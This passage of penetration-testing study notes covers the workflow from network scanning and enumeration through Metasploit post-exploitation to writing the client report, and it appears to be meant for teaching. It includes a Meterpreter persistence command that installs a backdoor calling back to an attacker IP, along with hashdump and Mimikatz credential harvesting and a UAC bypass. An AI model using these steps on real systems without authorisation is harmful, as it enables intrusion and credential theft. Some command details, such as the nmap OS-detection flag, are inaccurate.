The presence of the RST flag shows that we need to reset the connection. This may be due to connection errors and the FIN flag indicates that there are no other data that the sender should receive.

**The Three-way handshake**

This connection creation process is based exclusively on the SYN and ACK flags.

The three-way handshake is an exchange of packets between two entities that use TCP flags (SYN and ACK) to organize their communication. We can find all the information we need on Wireshark.

**Creation of customized network packages**

There are several software options that allow the creation and modification of packets that travel within a network.

**Level 4 Network scan: Connect scan**

This type of scan establishes the TCP connection. In other words, it completes the three-way handshake, making the scan very noisy and easily identifiable.

Use KFSensor, Wireshark, and Nmap to perform a simulation.

**Level 4 Network scan: SYN scan**

The SYN type scan, unlike the Connect scan, does not complete the three-way handshake completely.

The exchange takes place as follows:

-   The attacker sends a packet with the SYN flag set.
-   The victim responds with a packet with configured SYN and ACK flags.
-   The attacker, at this point, does not complete the handshake but sends a packet with the RST flag. This will force a reset of the connection and not establish it completely.

This is a relatively "silent" scan. If there is a system in the target network that tracks the connections established, it will not record this connection attempt. This is because no connection has been completely established.

Here too, we should start Nmap and run the following command:

#$ nmap -sS -v -p 80 192.168.1.129

We now need to verify the scan with Wireshark and check the RST flag sent by the attacking machine.

Finally, we verify the scan with KFSensor, which can even accurately detect our attempt of using SysScan.

Nmap can successfully complete this scan.

**Level 4 Network scan: UDP scan**

The previous scans are related to the TCP protocol. However, even the UDP protocol can provide interesting results, because it is often underestimated and not adequately protected by network administrators.

Keep in mind that the UDP protocol is connectionless and therefore behaves differently from TCP. In particular, if a scan is launched on a certain port and we receive no response, then we can assume that the port is open.

Otherwise, we will receive an ICMP error message, which means that the port is closed or cannot provide significant information.

## Banner Grabbing

It's time to identify what type of service is running on a specific port. This information will be useful to us in the next phase where we will look for vulnerabilities. In particular, the outdated version of a service could be exploited by a potential hacker.

We will start from the services normally associated with standard ports, and then move on the ones linked to unconventional ports.

**Banner visualisation in Microsoft IIS**

Let's connect to the web server using "telnet"

#$ telnet 127.0.0.1 80

Once the channel has been set up, we can enter two commands that allow us to interact with the web server:

-   GET / HTTP/1.1
-   HOST: 127.0.0.1

We have captured the banner of our IIS web server. We can now identify the type of service and its version. This information will be useful during the vulnerability assessment phase.

**Banner configuration on KFSensor**

We should use KFSensor to simulate a Microsoft IIS type web server. Once the configuration is complete, we can use the Nmap feature called "service detection", which will attempt to grab the banner of the listening service and inform us of what version it is.

**[Installing a FTP Server; FTP banner grabbing with Nmap; FTP banner grabbing with Metasploit; FTP banner grabbing with Netcat] - topics to study and learn how to do!**

**Operating System detection**

We can follow two different procedures:

-   Active mode
-   Passive mode

In the active mode, we interact directly with the target. Nmap is a tool commonly used in active mode.

The passive mode listens to network traffic. Based on the characteristics of each operating system, we can obtain fairly precise information. A tool that works in this mode is "P0f".

**OS detection with Nmap**

Let's see how to detect the operating system of a certain machine using Nmap. the option to use is "-o":

root@kali:~# nmap -n -o -p 1-100 192.168.1.10

By running this command, we will examine only the first 100 doors and try to detect the operating system.

**OS detection with P0f**

This tool allows to perform a passive operating system detection. In this case, we do not need to interact directly with the target machine.

We need to capture some network traffic, so that P0f can complete the detection process.

## Enumeration

Enumeration is an important phase of the penetration test process. It consists in exploiting the characteristics of a certain service in order to obtain as much information as possible.

There are services that work well with this type of investigation, such as:

-   SMTP, TCP port 25
-   DNS, UDP port 53
-   SNMP, UDP port 161
-   NETBIOS, UDP port 137, 138; TCP port 139.

**Enumeration with NETBIOS**

Netbios is a protocol that operates at the session layer of the ISO/OSI model. This protocol allows us to explore the network resources of computers, printers or files.

We can use Netbios to extract several information, including Hostname; Username; Domain; Printers; Available network folders.

First of all, we should use Nmap to confirm that the TCP ports 139 and 445 are actually open:

nmap -v -p 139,445 192.169.1.120

After completing this step, we can use a special command, the NBTSCAN, to investigate systems with open ports 139, 445.

We can refer to another Windows command - "net view" - to continue our investigation on a specific host:

net view 192.168.1.10

It gives us the list of shared resources on our target. The "net use" command allows us to access these resources.

Nmap contains many scripts that can be used to enumerate NETBIOS. You can find them on the following path:

/usr/share/nmap/scripts.

These are the scripts we need to verify any NETBIOS vulnerabilities:

-   smb-vuln-conficker
-   smb-vuln-cve2009-3103
-   smb-vuln-ms06-025
-   smb-vuln-ms07-029
-   smb-vuln-regsvc-dos
-   smb-vuln-ms08-067

**Enumeration with DNS**

Let's proceed with another DSN enumeration technique for which we will be using a tool called DNSENUM.

With a single command we can extract different DNS records, which are the following ones: SOA; A; MX; NS; Cname; PTR; HINFO; TXT.

We need to run this command:

root@kali:~# dnsenum [[domain.com](http://domain.com)]

**Enumeration with default password**

Network devices - such as routers and switches - very often have a default password. These passwords are defined directly by the device manufacturer.

DefaultPassword is one of the many sites where default device passwords are stored ([https://default-password.info/](https://default-password.info/)).

## Vulnerability assessment

A part of this research should be carried out manually, while we can use some tools to automate other parts of this process.

At this link, you can find a detailed report that lists all the steps we should take to perform a vulnerability Assessment: [](https://www.sans.org/reading-room/whitepapers/basics/vulnerability-assessment-421)[https://www.sans.org/reading-room/whitepapers/basics/vulnerability-assessment-421](https://www.sans.org/reading-room/whitepapers/basics/vulnerability-assessment-421).

Unlike vulnerability assessment, a penetration test has the additional purpose of exploiting the vulnerabilities found.

List of tools to use: Nessus; Nexpose; OpenVAS.

**Websites for vulnerability search**

Here is a list of websites you refer to for more details about each vulnerability:

-   Exploit Database: [https://www.exploit-db.com/](https://www.exploit-db.com/)
-   Security Focus: [http://www.securityfocus.com/](http://www.securityfocus.com/)
-   Packet Storm: [https://packetstormecurity.com/](https://packetstormecurity.com/)
-   CVE Details: [http://www.cvedetails.com/](http://www.cvedetails.com/)

## Exploitation

We saw how to search for vulnerabilities, but we also limited ourselves to perform an automatic analysis. As we grow our experience in this field, we will need to integrate this type of analysis with manual search, where we will perform code customization.

Now that we have a list of possible vulnerabilities, we need to verify whether they are actually exploitable or not. Exploitation is meant to confirm if we can access our target machine from a given vulnerability.

An exploit is a sequence of commands, or lines of code, that exploit the vulnerabilities of a certain software. It can allow us to take actions that come as unexpected to the victim machine.

_**Exploits can be classified as follows:**_

-   _**Service-side exploit:**_ this type of exploits affects a particular service listening on the target machine.
-   _**Client-side exploit:**_ the attack starts directly from the client machine.
-   _**Local privilege escalation exploit:**_ once we have access to the target machine, we need to elevate our privileges using exploits belonging to this category.

**Service-side exploitation**

On a generic machine, we have multiple services listening on certain ports. A web server, for example, will most likely listen on port 80 and communicate via the http protocol.

If, for any reason, one of these services is not configured correctly, it offers a great advantage to a possible attacker. This is obviously consequent to another series of particular conditions, including, for example, the perimeter firewall that allows access to that particular port on that PC. Once you have gained access to a specific machine, you can proceed recursively to gain access to other machines that may be visible only from the first compromised machine. In technical jargon, this action is called "pivoting".

**Client-side exploitation**

In this case, the victim unknowingly unleashes the attack and establishes a connection with the attacking machine.

The attack vector is usually very common. For example, the victim can start an executable file received by the attacker.

This simple action may be sufficient to start a communication to the outside. In corporate networks, communication to the Internet is often granted and therefore perimeter security systems may not block this type of attack. This is a significant advantage over the first type of exploitation.

Here the user has a central role in starting the attack. The beginning of the attack coincides with a direct action performed by the victim.

To start the attack, it is enough for the target user to open an Excel file attached to an email or downloaded form the Internet.

**Metasploit**

When it comes to exploitation, we cannot fail to mention Metasploit. This is the most well-known tool used to automate the exploitation process.

Composed of various modules, its use is not the most immediate, and you need some experience to make the most of it.

We can say that Metasploit consists of the following elements:

-   an exploit database;
-   a payload database;
-   auxiliary modules for particular operations;
-   post-exploitation modules for the penetration test phase.
-   user interface to easily manage the whole structure.

The user interface is composed of several modules, including:

-   _msfconsole -_ from which we can execute several exploits/payloads.
-   _MSFD -_ Service listening on TCP port 5554 which allows multiple users to connect to the same Metasploit instance.
-   _armitage -_ a graphical version of Metasploit.
-   _msfvenon -_ it is mainly used in the client-side exploitation phase to convert our payloads into different types of executable files.

## Post-exploitation

Now that the host has been compromised, we need to look into all the activities that we should carry out after the exploitation. Among these, here are the most important ones:

-   Privilege escalation
-   Access maintenance
-   Data collection
-   Cyclic process of network scanning to new hosts
-   Repeated exploitation towards new hosts

**Privilege Escalation**

When we can access a host, we often do not have the highest privileges. We are simple users who are not authorized to peform any particular actions.

In machines with Windows, we will have to become an "Administrator" or "System". With Linux, your privilege should reach the level of "root".

**Maintaining access**

A session established with a compromised host can accidentally be closed. This situation leads to our loss of control over it.

There might be several reasons: the user restarted the PC, the process crashes, or the exploited application is closed. It is therefore important to make our session persistent so that we can access the host whenever we want.

**Data collection**

Within the host we can find sensitive and important information. These must be collected and organized so that they can be included in the final report we will deliver to our client.

This is often the only real strong demonstration to the management of how serious a network breach can be, and how it is necessary to adequately protect the network.

**Cyclical scanning and exploitation process**

Generally speaking, every time we access a new host, we need to follow again all the steps we have seen in the previous chapters. Basically, here is what we will do:

-   Network scanning
-   Banner grabbing
-   Enumeration
-   Vulnerability assessment
-   Exploitation
-   Post exploitation

**Privilege escalation**

Suppose we have a not persistent meterpreter session already established on our target. It can be closed by the user along with the process that allowed the communication to start. We should first migrate to a more stable process, which is more likely to remain active. You can proceed either automatically or manually.

The first point to note is that the persistence of a connection is directly linked to the type of privileges we have on the same machine. For this reason, we should also try to elevate our privileges.

The command used in these cases is "get system", which will rely on a set of techniques to raise our privileges until we find the one suitable for achieving our purpose. We can execute the "getuid" command to determine if our privilege escalation was successful.

**Privilege escalation with disabled UAC**

When performing privilege escalation on Windows 7 and newer operating systems, it is necessary to take into account a security mechanism that could create some difficulties for us.

The UAC (User Account Control), which allows an administrator user to perform administrative tasks during a standard user session. If the UAC is enabled, it will be impossible for us to perform a privilege escalation without taking other actions first.

**Privilege escalation with enabled UAC**

We should start our privilege escalation by checking whether the UAC is enabled or not. The Metasploit module that allows us to perform this task is called "win_privs".

There is a Metasploit module called "bypass UAC". Keep in mind that this module has a good chance of success only if the UAC is set to the default level and not to the maximum one.

**Credentials Hashdump**

A hash is a unique string generated from a certain password and based on a cryptographic algorithm. If the hash is not strong enough, it is possible to follow a reverse engineering process to recover the initial password.

Let's suppose we have an active session with administrative privileges, and we type the "hashdump" command. We can recover the hash of the users "Administrator", "user1", and "guest", for example. You can eventually try a password recovery ("password cracking") starting from these hashes.

**Local exploit suggester**

If the "getsystem" command is not effective, we can rely on the Metasploit module, which enumerates the machine in search of some exploits with high success chance. We always need to launch it with an active meterpreter session.

**Using the Mimikatz module**

The "Mimikatz" tool in Metasploit will allow us to collect the credentials of the machine to which we are logged. We should rely on a established meterpreter session and have the System privileges.

First of all, the module in Metasploit should be loaded with the "load mimikatz" command. Then we need to enter the "wdigest" command. The password has been hashed directly from the system memory and we have obtained the user credentials.

**Installing a backdoor on a target system**

We can install a "backdoor" on the target system in order to make the meterpreter session more stable. This also allows us to return to the target system whenever we deem it appropriate (remember that you need to remove it once you have completed the tasks requested by the client).

First of all, we should have the meterpreter session already configured with the "SYSTEM" or "Administrator" privileges.

The backdoor that we will use will be installed on a registry key of the target machine with the possibility of starting it every time the machine is booted.

This module is called "Persistence", and these are the options available:

Meterpreter > run persistence -h

meterpreter > run persistence -X -p 8081 -r 192.168.1.133 -i 5

Each option is defined more precisely as follows:

-   The "-X" option starts the backdoor each time the system is booted.
-   The "-p 8081" option is the port on which the attacking system will listen.
-   The "-r" option specifies the IP address of the attacking machine.
-   The "-i 5" option is the interval in seconds between each connection attempt.

We can now try to reboot the target machine and verify that a meterpreter shell is automatically created. If we drop the session, it will be re-established after 5 seconds thanks to the "-i 5" option which we mentioned earlier.

**Internal network mapping**

The next step in the exploitation phase is mapping of the internal network to discover other possible hosts.

The first useful command is "ipconfig", which helps us to get an overview of any network interfaces available.

Then, we can use the "route print" command to analyze the routing table of the machine and start to map the internal network.

The "arp -a" command gives us evidence of all the machines connected to that particular network segment. You can see the active network connections by entering the "netstat -an" command.

We can run an ARP-scan on the entire subnet directly from the meterpreter shell:

meterpreter > run arp_scanner -r 192.168.10/24

We can otherwise execute a ping sweep command to discover other new machines connected to that specific subnet.

## The Final Report

It is time to send the client a final report with our feedback on all accomplished tasks.

It is important to stress how fundamental this part is. We need to present in a clear and complete manner all the information we gathered as well as each suggestion that could help to correct the weaknesses we spotted.

In addition to the list of vulnerabilities found and exploits used, we should include a part related to the so-called "remediation". This part is meant to show the customer all the possible remedies for the risks we discovered.

It would be better to start the report with a general overview of the actions taken and then gradually enter into detail. In this way, the report becomes easier to read for members of the management board and non-techs, who will be able to understand exactly what is been reported.

Although we can also include other parts, a well-structured report usually consists of the following sections:

-   Executive summary
-   Methodology used
-   Detailed analysis of the results

**Executive Summary**

The executive summary is the report that can be understood even by non-technical staff, for example by managers.

First of all, we should define the scope and the estimated duration of this task. By defining the scope of this task, we want to know exactly what type of penetration test we should perform and even more importantly what are the IP addresses or websites that we should include.

We must point out the evidences found and their level of criticality. We also need to prepare a graph showing the risk distribution according to the different variables.

**Methodology**

The methodology used integrates all the phases from the definition of the test scope to the final report.

We can summarize the procedure as follows:

-   Definition of the test scope
-   Information gathering
-   Network scanning
-   Vulnerability assessment
-   Exploitation
-   Post exploitation
-   Other optional tests
-   Drafting of the report also through the use of automatic tools, for example with Dradis ([https://dradisframework.com/ce/](https://dradisframework.com/ce/)).

As a side note, the report must also contain all the results you achieved that were related to the web, including the SQL Injection and XSS Cross Site Scripting (which were not explained in this book).

You might also want to include the social engineering tehcniques you eventually used.

**Detailed Analysis of the results**

The first task to complete in this sub-phase is defining the risk level of the various vulnerabilities you detected:
![[Screenshot 2022-03-10 at 09.32.38.png]]
Then you can enlist all the vulnerabilities.

You can then conclude your report by mentioning the solutions and the suggestions that could help to block these risks and eradicate these problems.